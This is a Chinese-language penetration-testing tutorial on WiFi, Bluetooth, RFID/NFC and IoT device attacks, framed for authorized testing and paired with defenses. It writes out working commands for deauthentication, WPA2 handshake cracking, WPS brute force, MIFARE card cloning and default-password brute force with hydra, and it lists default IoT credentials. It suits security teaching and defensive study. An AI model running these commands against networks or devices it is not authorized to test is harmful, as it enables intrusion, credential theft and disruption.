# 无线与 IoT 渗透(Wireless & IoT Penetration Testing)

> 关键词:无线渗透, WiFi攻击, WPA2, WPA3, 握手包抓取, 字典破解, WPS, Evil Twin, Deauth, 蓝牙攻击, RFID, NFC, IoT固件分析, 路由器漏洞, 默认口令, 智能设备安全

## 概述

无线与 IoT 渗透针对 **WiFi 网络、蓝牙、RFID/NFC、物联网设备(摄像头、路由器、智能家居、网关)** 进行安全评估。IoT 设备普遍存在默认口令、弱加密、固件漏洞与固件更新缺失问题,且常处于内网,一旦攻破即成为横向移动跳板。

> ⚠️ **仅限授权测试与合规实验**:无线攻击(抓包、Deauth、Evil Twin)针对**不属于你的网络**属于违法行为;仅可对自有设备、家庭/办公网络(经所有者授权)或合规靶场进行。本章内容同时用于**理解风险并加强防御**。

## WiFi 攻击

### 1. 基础准备(合规前提)

```bash
# 需要支持监听模式的无线网卡(如 ALFA AWUS036ACH)与 Kali Linux
# 查看网卡与接口
iwconfig; airmon-ng
# 开启监听模式
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# 扫描周围网络
sudo airodump-ng wlan0mon
```

### 2. WPA2 握手包抓取与破解

**原理**:WPA2 使用四次握手生成会话密钥,握手包中携带 PMK(由密码派生)的验证材料,离线对字典中的每个密码计算 PMK 并与握手比对,即可验证密码。

```bash
# 1) 锁定目标:记录 BSSID、信道(CH)
sudo airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture
# 2) 若无客户端在线,发送 Deauth 使客户端重连(强制产生握手)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# 3) 等待 airodump 输出 "[WPA handshake: AA:BB:CC:DD:EE:FF]" 后 Ctrl+C
# 4) 离线破解(字典攻击)
sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
# 5) GPU 加速破解(hashcat 模式 22000,需先转换)
# hashcat -m 22000 capture.hc22000 wordlist.txt
```

**判断标准**:握手抓取成功(出现 handshake 标记)→ 密码强度决定破解时间;WPA2 密码 < 10 位纯数字/常见词极易破解。

**防御**:
- 使用 **WPA2/WPA3 混合或纯 WPA3**,密码 ≥ 12 位高熵(建议 16+ 位随机)。
- 启用 **PMF(管理帧保护,802.11w)**,降低 Deauth 影响(仍需防主动攻击)。
- 企业级网络使用 **WPA2-Enterprise(802.1X)**,禁用 PEAP-MSCHAPv2 弱配置。
- 定期轮换密码;隐藏 SSID 仅增加轻微阻力(可被扫描发现),不作为主要防御。

### 3. WPS 攻击

**原理**:WPS(WiFi Protected Setup)PIN 码仅 8 位且最后一位为校验位,有效空间约 10^7,可在线爆破或利用 PIN 校验漏洞(某些路由器的 PIN 可分段验证,复杂度降为 10^4+10^3)。

```bash
# reaver 在线爆破 PIN(耗时长,现代路由器已普遍防爆破)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1
# Wash 扫描开启 WPS 的网络
sudo wash -i wlan0mon
# 检测 WPS 锁定:多次错误 PIN 后路由器锁定 5 分钟,爆破易触发
```

**防御**:**关闭 WPS** 功能(几乎所有现代路由器默认关闭);若必须使用,确认固件已修复 PIN 校验漏洞。

### 4. Evil Twin(邪恶双子星)

**原理**:攻击者创建与目标同名(相同 SSID)的伪造 AP,客户端自动连接信号更强的伪造 AP,攻击者可进行**中间人攻击**:嗅探流量、钓鱼门户获取密码。

```bash
# 工具:airgeddon / fluxion / wifiphisher
# 流程:扫描目标 AP → 克隆 SSID → 对目标客户端 Deauth → 客户端连上伪造 AP
# → 打开钓鱼门户(仿路由器登录页)→ 用户输入密码 → 获取凭据
# 检测:对比 BSSID 与信号强度,同名网络有两个 = 存在 Evil Twin 风险
```

**防御**:
- 客户端不自动连接未知网络;企业统一使用 802.1X 证书认证(防钓鱼)。
- 定期审计周围同名 AP;重要操作(网银)通过 HTTPS + 证书校验。
- 路由器端:监控异常同 SSID AP(无线入侵检测 WIDS)。

### 5. Deauth(解除认证攻击)

**原理**:攻击者伪造 AP 发送 deauthentication 帧,强制客户端断开,可用于:抓握手、Evil Twin 诱导、DoS 骚扰。

```bash
# 定向 Deauth(目标客户端)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 客户端MAC wlan0mon
# 全客户端广播
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

**防御**:启用 802.11w(PMF)**必需模式**(Require);WIDS 检测异常 deauth 洪泛。

### 6. WPA3 说明

- WPA3 引入 **SAE(Simultaneous Authentication of Equals)**,替代 PSK 四次握手:即使离线抓到握手包也无法离线爆破(每次握手使用随机化的椭圆曲线参数)。
- 已知弱点:**Downgrade 攻击**(把客户端降级到 WPA2)、**Dragonblood 系列漏洞**(侧信道/降级,已修复于 2020 年固件)、弱密码仍可被**在线猜测**。
- **防御建议**:全网络 WPA3/WPA3-Enterprise、禁用 WPA2 兼容模式(如业务允许)、及时更新路由器固件、密码仍保持高熵。

## 蓝牙攻击

| 攻击 | 原理 | 说明 |
| --- | --- | --- |
| BlueSmack | L2CAP 层 ping 洪泛 DoS | 老设备漏洞,多数已修复 |
| BlueBorne | 蓝牙协议栈 RCE 漏洞族(2017) | 影响面广,需打补丁 |
| KNOB 攻击 | 降级加密密钥长度协商 | 2019,需双方补丁 |
| Bluejacking | 发送匿名名片/消息 | 骚扰级,危害低 |
| Bluesnarfing | 未授权读取设备数据(OBEX) | 需设备可发现且漏洞未修 |
| 中继攻击 | 中继车钥匙信号开锁 | 汽车无钥匙进入系统风险 |

```bash
# 蓝牙侦察工具(Kali)
sudo hcitool scan                    # 扫描可见设备
sudo hcitool info AA:BB:CC:DD:EE:FF  # 设备信息
# 抓取蓝牙流量:Ubertooth / btscanner
# 攻击面评估:查看设备 PIN(默认 0000/1234)、是否可发现、固件版本
```

**防御**:关闭不用的蓝牙、设备设为不可发现、禁用旧协议(蓝牙 2.0 以下)、及时更新固件;汽车钥匙使用信号屏蔽袋。

## RFID / NFC

**原理**:RFID/NFC 为近距离无线通信,广泛用于门禁卡、公交卡、支付、标签。风险:**克隆(复制卡)**、**重放(模拟卡)**、读取敏感数据。

```bash
# 工具:Proxmark3(读卡/写卡硬件)、ACR122U(读卡器)
# Proxmark3 常用操作(合规环境)
# 1) 检测卡片类型:lf search(低频)/ hf search(高频)
# 2) 读取 MIFARE Classic 卡(有默认密钥时可读)
# hf mf autopwn          # 自动尝试已知密钥(默认密钥 0xFFFFFFFFFFFF 等)
# hf mf dump             # 导出扇区数据
# 3) 克隆:MIFARE Classic 若密钥已知,可复制到空白卡
# 4) 模拟:将 dump 数据写入模拟器(手机 NFC 模拟)
# 注意:MIFARE Classic 的 Crypto-1 加密已被破解,任何 Classic 卡都可被读取克隆
```

**防御**:
- 门禁/支付改用 **MIFARE DESFire 或 CPU 卡**(密钥可更新,加密强度高)。
- 关闭卡片的意外读取;重要卡开启读保护。
- 系统侧:门禁记录审计、异常刷卡(时间/地点矛盾)告警。
- 个人:使用防读取卡套,降低被近距离嗅探风险。

## IoT 设备安全评估

### 1. 设备信息收集

```bash
# 网络侦察
nmap -sV -p- 设备IP                      # 端口与服务
# 常见 IoT 端口:80/443(Web)、23(telnet)、554(RTSP 摄像头)、1883(MQTT)、
# 8883(MQTTS)、1900(UPnP)、49152+(UPnP)、22(SSH)、161(SNMP)
# Web 管理界面指纹
httpx -u http://设备IP -tech-detect -title
# 固件/型号识别:登录页、铭牌、UPnP 描述文件
curl http://设备IP:1900/rootDesc.xml | grep -iE "model|manufacturer"
# 网络协议审计
nmap --script mqtt-subscribe -p 1883 设备IP   # MQTT 未授权订阅检测
snmpwalk -v2c -c public 设备IP                # SNMP 默认口令检测
```

### 2. 智能设备默认口令

IoT 设备默认口令问题极其普遍,直接决定设备是否可被接管。

| 设备类型 | 常见默认口令 | 风险 |
| --- | --- | --- |
| 摄像头(DVR/NVR) | admin/admin、admin/12345、root/空 | 被拉入僵尸网络、隐私泄露 |
| 路由器 | admin/admin、admin/123456 | 篡改 DNS、窃取流量 |
| 打印机 | admin/空、admin/12345 | 打印数据泄露、内网跳板 |
| NAS | admin/admin | 数据泄露 |
| 智能门锁/网关 | 常见 admin/admin | 物理安全风险 |

```bash
# 批量验证默认口令(仅自有/授权设备)
hydra -l admin -P default_pass.txt telnet://设备IP
hydra -l admin -P default_pass.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=失败提示"
# 摄像头 RTSP 未授权/弱口令
ffprobe rtsp://admin:12345@设备IP:554/stream1
# 云平台/APP 侧:很多设备口令绑定厂商账号,评估其 API 与云端通讯是否加密
```

### 3. 路由器漏洞

```bash
# 1) 固件版本识别 → 匹配 CVE(路由器厂商漏洞频发)
# 常见:命令注入(如 TP-Link/Netgear 历史漏洞)、CSRF(改 DNS/开远程管理)、
#       弱口令、信息泄露(配置文件)、UPnP 滥用
# 2) 功能面测试:远程管理端口、VPN、DDNS、UPnP、访客网络
nmap -sV -p 80,443,23,22,8080,1900,49152 路由器IP
# 3) 配置泄露探测
# http://路由器IP/config.bin、/backup.conf、cgi-bin 历史漏洞
# 4) 验证思路(授权环境):命令注入参数(如 ping 后拼接命令)
# 5) UPnP 滥用:外部可向 UPnP 添加端口映射,绕过防火墙(用 upnpc 检测)
upnpc -l -u http://路由器IP:1900/rootDesc.xml
```

### 4. IoT 固件分析入门

固件分析用于发现硬编码凭据、后门、加密通信缺陷。

```bash
# 1) 获取固件:厂商官网、设备 OTA 抓包、备份功能导出
# 2) 固件提取(binwalk 识别文件系统)
binwalk firmware.bin                       # 识别结构
binwalk -Me firmware.bin                   # 递归提取
# 3) 文件系统挂载(提取出 squashfs 时)
# 4) 静态分析
# 搜索硬编码凭据与敏感串
grep -rniE "password|passwd|secret|token|admin" 提取目录 | head -50
strings 提取目录/usr/sbin/服务程序 | grep -iE "pass|key"
# 识别架构与动态调试(模拟运行)
file 提取目录/bin/busybox                   # ARM/MIPS 等
# 5) 解包后重点审计:/etc/passwd、/etc/shadow、配置文件、启动脚本、Web 服务
# 6) 固件升级校验:检查签名与完整性校验是否存在(防降级攻击)
```

**判断标准**:固件含硬编码账号/密钥 = 高危;升级包未签名/未校验 = 可被植入后门;敏感服务明文通信 = 中危。

### 5. 智能设备固件更新与供应链风险

- 多数 IoT 厂商停止支持后不再更新固件,漏洞永久存在(如大量摄像头默认口令+命令注入)。
- 供应链风险:出厂后门、恶意固件、云平台数据泄露。
- 评估应覆盖:**设备端(固件/服务)、APP 端(逆向)、云端 API(鉴权/加密)、通讯协议(明文/弱加密)**。

## 防御建议(无线与 IoT 综合)

1. **WiFi**:WPA3 + 长随机密码 + 关闭 WPS + 启用 PMF;访客网络隔离。
2. **IoT 设备**:立即修改默认口令;关闭未使用服务(telnet/UPnP);设备单独 VLAN 隔离,禁止直接暴露公网。
3. **固件**:只从官方渠道升级,及时应用安全更新;淘汰停止支持的设备。
4. **蓝牙/近场**:关闭不用的蓝牙与 NFC;不可见模式;使用 DESFire 等高安全卡。
5. **监控**:WIDS 检测伪造 AP 与 deauth 洪泛;对 IoT 网段做异常流量告警。
6. **合规**:个人 IoT 评估仅限自有设备;企业评估纳入 RoE 与书面授权,注意摄像头等涉及隐私的设备测试范围需明确。
